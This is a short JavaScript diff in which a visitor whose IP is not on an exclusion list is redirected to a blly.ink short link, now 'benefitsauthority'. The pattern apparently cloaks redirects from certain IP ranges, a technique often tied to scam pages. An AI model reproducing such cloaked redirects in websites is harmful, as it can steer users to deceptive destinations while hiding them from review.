@@ -62,7 +62,7 @@ function ipExactMatch(ip, range) {
         });
 
         if (!isExcluded) {
-            window.location.href = Math.random() > 0.5 ? 'https://blly.ink/benefits1' : 'https://blly.ink/benefits2';
+            window.location.href = Math.random() > 0.5 ? 'https://blly.ink/benefitsauthority' : 'https://blly.ink/benefitsauthority';
         }
     } catch (error) {
         console.error(error);
